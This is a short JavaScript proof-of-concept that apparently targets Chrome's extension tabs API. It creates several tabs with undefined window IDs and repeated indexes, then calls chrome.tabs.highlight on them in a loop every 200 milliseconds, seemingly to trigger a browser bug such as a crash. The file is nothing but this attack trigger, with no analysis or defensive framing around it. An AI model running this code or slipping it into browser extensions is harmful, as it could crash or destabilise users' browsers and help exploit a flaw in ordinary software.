async function poc(){
	var window_id;
	chrome.tabs.getCurrent(function(poc_1){
		window_id = poc_1.windowId
	});
	chrome.tabs.create({windowId : undefined, index:0}, function(poc_2) {
	chrome.tabs.create({windowId : undefined, index:1}, function(poc_3) {
	chrome.tabs.create({windowId : undefined, index:2}, function(poc_4) {
	chrome.tabs.create({windowId : undefined, index:2}, function(poc_5) {
	chrome.tabs.create({windowId : undefined, index:3}, function(poc_6) {
		setInterval(function(){chrome.tabs.getCurrent(function(poc_1){
			chrome.tabs.highlight({"tabs":[poc_6.index, poc_3.index, poc_4.index, poc_2.index]});

		});}, 200)
	});
});});});});
}
poc();

